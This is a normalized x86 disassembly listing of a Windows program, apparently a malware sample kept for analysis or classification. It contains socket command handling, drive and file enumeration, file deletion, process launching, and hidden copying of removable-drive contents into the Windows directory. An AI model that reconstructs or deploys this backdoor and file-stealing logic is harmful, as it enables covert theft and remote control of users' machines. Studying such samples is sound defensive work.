call [ Ordinal_WSOCK32_57@IAT ]
test eax eax
jne r-xdata
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
jmp r-xdata
push rw-data
call strcpy
pop ecx
pop ecx
leave
retn
sub_4024a7
push ebp
mov ebp esp
sub esp 0x124
push ebx
mov ebx [ Ordinal_WSOCK32_12@IAT ]
push esi
push edi
xor edi edi
push 0x1
cmp [ rw-data ] edi
pop esi
jne r-xdata
push edi
push esi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
push edi
push esi
push 0x2
mov [ rw-data ] edi
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push 0x8004667e
push eax
call ebx
mov eax [ rw-data ]
mov [ ebp - 0xc ] 0x3c
mov [ ebp - 0x120 ] eax
mov ax [ rw-data ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x1c ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
push rw-data
mov [ ebp - 0x1a ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push 0x10
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_4@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x124 ]
push edi
push eax
mov eax [ rw-data ]
push edi
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push 0x8004667e
push eax
call ebx
mov eax [ rw-data ]
mov [ ebp - 0xc ] 0x3c
mov [ ebp - 0x120 ] eax
mov ax [ rw-data ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x1c ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
mov [ ebp - 0x1a ] ax
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push 0x10
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_4@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x124 ]
push edi
push eax
mov eax [ rw-data ]
push edi
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
mov [ rw-data ] esi
cmp [ rw-data ] edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
call sub_402c04
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push edi
push edi
push sub_402a0f
push edi
push edi
call [ CreateThread@IAT ]
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] edi
mov eax esi
sub_402668
push ebp
mov ebp esp
mov eax 0x2008
call sub_403820
mov eax [ rw-data ]
push ebx
push esi
push edi
push 0x1
cmp eax 0x53
pop ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x2008 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ ebp - 0x2008 ] al
jmp r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
push 0x5
pop ecx
sub ecx [ ebp + 0x8 ]
push esi
add eax ecx
mov [ ebp - 0x2007 ] eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x2008 ]
push 0x5
push eax
call sub_401d45
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp - 0x2008 ] 0x59
jne r-xdata
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ ebp + 0xc ]
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call [ fopen@IAT ]
push edi
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
push eax
call [ fseek@IAT ]
add esp 0x14
cmp [ rw-data ] edi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x55
call sub_403059
jmp r-xdata
push 0x6
pop eax
mov [ ebp - 0x2007 ] eax
push eax
lea eax [ ebp - 0x2008 ]
push eax
call sub_401d45
pop ecx
mov eax ebx
pop ecx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov esi 0x2000
pop edi
pop esi
pop ebx
leave
retn
cmp ebx esi
jne r-xdata
cmp [ rw-data ] 0x41
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push [ ebp - 0x8 ]
call [ fclose@IAT ]
mov eax [ ebp - 0x4 ]
pop ecx
push [ ebp - 0x8 ]
call [ fclose@IAT ]
pop ecx
push edi
push [ ebp + 0xc ]
call [ SetFileAttributesA@IAT ]
push [ ebp + 0xc ]
call [ DeleteFileA@IAT ]
push 0x1
pop eax
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x2008 ]
push esi
push 0x1
push eax
call [ fread@IAT ]
mov ebx eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2008 ]
push eax
lea eax [ ebp - 0x2008 ]
push esi
push eax
call sub_4023cf
lea eax [ ebp - 0x2008 ]
push ebx
push eax
call sub_401cb8
add esp 0x28
test eax eax
je r-xdata
sub_4027ff
push ebp
mov ebp esp
sub esp 0x400
push esi
lea eax [ ebp - 0x400 ]
push [ rw-data ]
push eax
call strcpy
lea eax [ ebp - 0x400 ]
push eax
call strlen
add esp 0xc
mov esi eax
mov [ rw-data ] 0x4f
call sub_403059
pop esi
leave
retn
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcpy
mov eax [ rw-data ]
add eax esi
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcat
mov eax [ rw-data ]
add eax esi
push eax
call strlen
add esp 0x14
lea esi [ esi + eax + 0x1 ]
lea eax [ ebp - 0x200 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax + esi ] 0x30
jne r-xdata
inc esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ ebp - 0x200 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
sub_4028a8
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
call memcpy
mov eax [ rw-data ]
xor esi esi
mov [ rw-data ] eax
add esp 0xc
movsx eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax 0x50
jg r-xdata
sub eax 0x52
je r-xdata
je r-xdata
call sub_402d30
dec eax
je r-xdata
call sub_4032af
jmp r-xdata
sub eax 0x41
je r-xdata
push 0x1
pop eax
pop esi
leave
retn
mov [ rw-data ] esi
mov esi rw-data
push esi
mov [ ebp - 0x100 ] 0x5a
call strlen
add eax 0x5
push esi
mov [ ebp - 0xff ] eax
lea eax [ ebp - 0xfb ]
push eax
call strcpy
push esi
call strlen
add eax 0x5
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_401d45
add esp 0x18
call sub_4027ec
jmp r-xdata
sub eax 0x3
je r-xdata
cmp [ rw-data ] esi
mov [ rw-data ] 0x1
je r-xdata
dec eax
je r-xdata
call sub_40307e
jmp r-xdata
dec eax
dec eax
jne r-xdata
call sub_402d4e
jmp r-xdata
dec eax
dec eax
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
call sub_4027ff
jmp r-xdata
dec eax
je r-xdata
sub eax 0x5
je r-xdata
jmp r-xdata
sub_4029bd
push esi
push edi
call [ rw-data ]
mov edi eax
mov [ rw-data ] edi
call [ rw-data ]
sub eax [ rw-data ]
cmp eax 0x1b7740
jbe r-xdata
call sub_401a3e
mov edi esi
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] esi
call [ rw-data ]
mov esi eax
sub eax edi
cmp eax 0xea60
jbe r-xdata
sub_402a0f
push ebp
mov ebp esp
mov eax 0x2004
call sub_403820
push ebx
push esi
mov esi [ ebp - 0x4 ]
xor ebx ebx
push edi
mov edi [ Sleep@IAT ]
mov [ rw-data ] ebx
mov al [ ebp - 0x2004 ]
sub esi 0x5
mov [ rw-data ] al
mov [ rw-data ] ebx
call sub_402b37
test eax eax
je r-xdata
mov [ rw-data ] bl
push eax
lea eax [ ebp - 0x2004 ]
push eax
push [ rw-data ]
call memcpy
sub esi [ rw-data ]
add esp 0xc
cmp esi ebx
jg r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ ebp - 0x2004 ]
push 0x5
push eax
call sub_402b98
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
pop edi
pop esi
mov [ rw-data ] 0x1
xor eax eax
pop ebx
leave
retn 0x4
mov [ rw-data ] ebx
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp - 0x2003 ]
cmp esi 0x5
jl r-xdata
push 0x1
call edi
cmp [ rw-data ] ebx
jne r-xdata
cmp esi ebx
jg r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x1
call edi
jmp r-xdata
cmp [ rw-data ] bl
jne r-xdata
cmp [ ebp - 0x2004 ] 0x5a
jne r-xdata
lea eax [ ebp - 0x2004 ]
push esi
push eax
call sub_402b98
pop ecx
cmp eax 0xffffffff
pop ecx
mov [ rw-data ] eax
je r-xdata
mov [ rw-data ] bl
jmp r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
jmp r-xdata
sub_402b37
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ Sleep@IAT ]
xor ebx ebx
test eax eax
jle r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
call esi
jmp r-xdata
cmp [ ebp - 0x1 ] 0xd
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
push 0x1
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
jne r-xdata
inc ebx
cmp ebx 0x4
jge r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
pop esi
pop ebx
leave
retn
push 0x1
pop eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_402b98
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov eax 0x2000
xor esi esi
xor ebx ebx
cmp edi eax
jle r-xdata
test edi edi
jle r-xdata
mov edi eax
mov eax edi
mov eax edi
push 0x0
sub eax esi
push eax
mov eax [ esp + 0x18 ]
add eax esi
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
jg r-xdata
add esi eax
xor ebx ebx
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax ebx
inc ebx
cmp eax 0x1770
jg r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
cmp esi edi
jl r-xdata
sub_402c04
push ebp
mov ebp esp
sub esp 0x488
and [ ebp - 0x4 ] 0x0
push esi
mov esi rw-data
lea eax [ ebp - 0x283 ]
push esi
push eax
mov [ ebp - 0x288 ] 0x41
call strcpy
push esi
call strlen
mov esi eax
mov eax [ rw-data ]
add esi 0x6
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
lea eax [ ebp - 0x488 ]
push eax
push 0x200
add esi 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x288 ]
push esi
push eax
mov [ ebp - 0x287 ] esi
call sub_401d45
pop ecx
pop ecx
pop esi
leave
retn
cmp [ ebp - 0x488 ] 0x0
je r-xdata
push ebx
push edi
lea edi [ ebp - 0x488 ]
and [ ebp - 0x88 ] 0x0
xor eax eax
push eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x88 ]
push 0x80
push eax
push edi
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
push edi
call strlen
mov ebx eax
lea eax [ ebp + esi - 0x288 ]
push edi
push eax
inc ebx
call strcpy
add esp 0xc
add esi ebx
push edi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
pop ebx
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp + esi - 0x288 ]
push eax
call strcpy
lea eax [ ebp - 0x88 ]
push eax
call strlen
add [ ebp - 0x4 ] ebx
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x8 ]
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
mov eax [ ebp - 0x4 ]
add esi 0x4
cmp [ ebp + eax - 0x488 ] 0x0
lea edi [ ebp + eax - 0x488 ]
jne r-xdata
sub_402d4e
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
push edi
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push [ rw-data ]
push eax
call memcpy
mov esi [ strrchr@IAT ]
push 0x5c
push [ rw-data ]
call esi
push eax
call sub_402f99
lea eax [ ebp - 0x214 ]
push 0x5c
push eax
call esi
add esp 0x20
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call strcat
push 0x7d00
mov [ ebp - 0x14 ] 0x42
call [ malloc@IAT ]
mov edi eax
add esp 0xc
test edi edi
je r-xdata
and [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x214 ]
push eax
call sub_402f2d
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
push edi
call [ free@IAT ]
pop ecx
test esi esi
jne r-xdata
lea eax [ esi + esi * 4 ]
push 0x5
shl eax 0x6
add eax 0x5
mov [ ebp - 0x13 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_401d45
pop ecx
lea eax [ ebp - 0x214 ]
pop ecx
push edi
push eax
call [ rw-data ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
jne r-xdata
push 0x1
pop esi
push edi
call sub_402fe6
test eax eax
pop ecx
je r-xdata
lea eax [ edi + 0x2c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x8 ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_4023cf
push ebx
push edi
call sub_401cb8
push edi
call [ free@IAT ]
add esp 0x24
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea ebx [ esi - 0x1 ]
test ebx ebx
jle r-xdata
lea eax [ ebp - 0xc ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_4023cf
push ebx
push edi
call sub_401cb8
add esp 0x18
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
push edi
push [ ebp - 0x4 ]
call sub_402ee1
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
push edi
call [ free@IAT ]
pop ecx
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
add [ ebp - 0x8 ] eax
lea esi [ eax + eax * 4 ]
lea eax [ ebp - 0xc ]
shl esi 0x6
push eax
push edi
push esi
push edi
call sub_4023cf
push esi
push edi
call sub_401cb8
add esp 0x18
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
jl r-xdata
sub_402ee1
push ebx
push esi
mov esi [ FindNextFileA@IAT ]
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
push edi
push [ esp + 0x14 ]
mov eax ebx
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
call sub_402fe6
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp ebx 0x64
jge r-xdata
inc ebx
add edi 0x140
push edi
push [ esp + 0x14 ]
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_402f2d
push ebp
mov ebp esp
sub esp 0x140
push esi
lea eax [ ebp - 0x140 ]
push edi
push eax
push [ ebp + 0x8 ]
xor edi edi
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
lea eax [ ebp - 0x140 ]
push eax
call sub_402fe6
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x140 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push esi
call [ FindClose@IAT ]
jmp r-xdata
sub_402f99
and [ rw-data ] 0x0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
push edi
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
and [ esi ] 0x0
test esi esi
jne r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
mov [ eax * 4 + rw-data ] edi
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop edi
sub_402fe6
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
test [ eax ] 0x10
push edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
add eax 0x2c
push 0x2e
push eax
call [ strrchr@IAT ]
xor ebp ebp
pop ecx
cmp [ rw-data ] ebp
pop ecx
mov ebx eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
xor eax eax
mov edi [ lstrcmpiA@IAT ]
mov esi rw-data
test ebx ebx
je r-xdata
push rw-data
push [ esi ]
mov eax [ esi ]
inc eax
inc eax
push eax
lea eax [ ebx + 0x1 ]
push eax
jmp r-xdata
inc ebp
add esi 0x4
cmp ebp [ rw-data ]
jl r-xdata
call edi
test eax eax
je r-xdata
push rw-data
push [ esi ]
call edi
test eax eax
je r-xdata
sub_403059
push ebp
mov ebp esp
push ecx
push ecx
mov al [ rw-data ]
push 0x6
mov [ ebp - 0x3 ] al
pop eax
mov [ ebp - 0x7 ] eax
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x52
push eax
call sub_401d45
pop ecx
pop ecx
leave
retn
sub_40307e
push ebp
mov ebp esp
sub esp 0x108
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push rw-data
push esi
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
add eax 0x4
push eax
call strlen
mov edi eax
pop ecx
cmp edi 0x114
mov [ ebp - 0x8 ] edi
jae r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
push eax
call [ fclose@IAT ]
pop ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov esi rw-data
add eax 0x4
push eax
push esi
call strcpy
cmp [ rw-data ] 0x56
pop ecx
pop ecx
jne r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_403059
cmp [ rw-data ] 0x56
jne r-xdata
push ebx
push esi
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x108 ]
push esi
push eax
call strcat
lea eax [ ebp - 0x108 ]
push eax
push esi
call strcpy
add esp 0x18
push esi
call sub_4031f4
pop ecx
push rw-data
push rw-data
jmp r-xdata
mov [ rw-data ] 0x45
call sub_403059
jmp r-xdata
mov eax [ rw-data ]
lea edi [ eax + edi + 0x5 ]
mov eax [ rw-data ]
sub eax [ ebp - 0x8 ]
sub eax 0x5
jmp r-xdata
push esi
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
push ecx
push edi
push eax
push edi
call sub_4023cf
push ebx
push [ ebp - 0x4 ]
push 0x1
push edi
call [ fwrite@IAT ]
push ebx
call [ fclose@IAT ]
add esp 0x24
cmp [ rw-data ] 0x0
je r-xdata
sub_4031f4
push ebp
mov ebp esp
sub esp 0x254
push ebx
push esi
push rw-data
push [ ebp + 0x8 ]
call [ strstr@IAT ]
pop ecx
xor ebx ebx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] bx
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call [ CreateProcessA@IAT ]
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x254 ]
push eax
call strcpy
mov esi [ strchr@IAT ]
lea eax [ ebp - 0x254 ]
push 0x22
push eax
call esi
add esp 0x10
cmp eax ebx
je r-xdata
inc eax
push 0x22
push eax
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x254 ]
push 0x5c
push eax
call [ strrchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] bl
mov [ eax + 0x1 ] bl
jmp r-xdata
lea eax [ ebp - 0x253 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_4032af
push ebp
mov ebp esp
sub esp 0x408
mov [ rw-data ] 0x4f
call sub_403059
push [ rw-data ]
call strlen
pop ecx
mov ecx [ rw-data ]
add eax ecx
cmp [ eax - 0x2 ] 0x3a
jne r-xdata
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x200 ]
pop ecx
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push eax
call [ GetFileAttributesA@IAT ]
or al 0x2
push eax
lea eax [ ebp - 0x200 ]
push eax
call [ SetFileAttributesA@IAT ]
push [ rw-data ]
call strlen
mov ecx [ rw-data ]
and [ eax + ecx - 0x1 ] 0x0
push [ rw-data ]
lea eax [ ebp - 0x408 ]
push rw-data
push eax
call [ wsprintfW@IAT ]
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0x408 ]
push eax
call sub_40337f
add esp 0x18
cmp [ eax - 0x1 ] 0x5c
je r-xdata
leave
retn
sub_40337f
push ebp
mov ebp esp
mov eax 0x126c
call sub_403820
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ wsprintfW@IAT ]
lea eax [ ebp - 0xc6c ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x364 ]
push eax
lea eax [ ebp - 0xc6c ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
pop eax
mov edi rw-data
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
cmp [ ebp - 0x338 ] 0x2e
je r-xdata
lea eax [ ebp - 0x364 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x338 ]
push eax
lea eax [ ebp - 0x564 ]
push eax
call [ wcscpy@IAT ]
test [ ebp - 0x364 ] 0x10
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0xa ]
push [ rw-data ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
lea eax [ ebp - 0x864 ]
push rw-data
push eax
call esi
mov eax [ rw-data ]
add esp 0x1c
inc [ rw-data ]
cmp eax 0x1869f
jle r-xdata
push [ rw-data ]
mov ebx [ sprintf@IAT ]
lea eax [ ebp - 0x664 ]
push rw-data
push eax
call ebx
mov eax [ rw-data ]
add esp 0xc
inc [ rw-data ]
cmp eax 0x1869f
jle r-xdata
lea eax [ ebp - 0x564 ]
push 0x2e
push eax
call [ wcsrchr@IAT ]
mov ebx eax
lea eax [ ebp - 0x564 ]
push eax
lea eax [ ebp - 0xe6c ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
add esp 0x18
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
lea eax [ ebp - 0x564 ]
push eax
lea eax [ ebp - 0x126c ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
lea eax [ ebp - 0x664 ]
push eax
lea eax [ ebp - 0x114 ]
push [ ebp + 0xc ]
push rw-data
push eax
call ebx
add esp 0x20
lea eax [ ebp - 0x114 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x126c ]
push eax
call sub_40337f
pop ecx
test eax eax
pop ecx
je r-xdata
and [ rw-data ] 0x0
add ebx 0x2
lea eax [ ebp - 0x864 ]
push ebx
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xa64 ]
push rw-data
push eax
call esi
add esp 0x14
lea eax [ ebp - 0x864 ]
push eax
lea eax [ ebp - 0xa64 ]
push [ ebp + 0xc ]
push rw-data
push eax
call esi
add esp 0x10
jmp r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
lea eax [ ebp - 0xa64 ]
push 0x0
push eax
lea eax [ ebp - 0xe6c ]
push eax
call [ CopyFileW@IAT ]
jmp r-xdata
sub_403820
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4039db
cmp [ rw-data ] ebx
jne r-xdata
call sub_4039c6
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4039d8
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4039f0
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_403a08
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401058
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_40105e
mov eax r--data
retn
sub_401064
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401078
push esi
mov esi ecx
call sub_401094
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_401094
jmp Ordinal_MFC42_815
sub_401099
call sub_4010a3
jmp sub_4010ad
sub_4010a3
mov ecx rw-data
jmp sub_401064
sub_4010ad
push sub_4010b9
call sub_4037ca
pop ecx
retn
sub_4010b9
mov ecx rw-data
jmp sub_401094
sub_40112d
jmp Ordinal_MFC42_641
sub_401132
retn
sub_401133
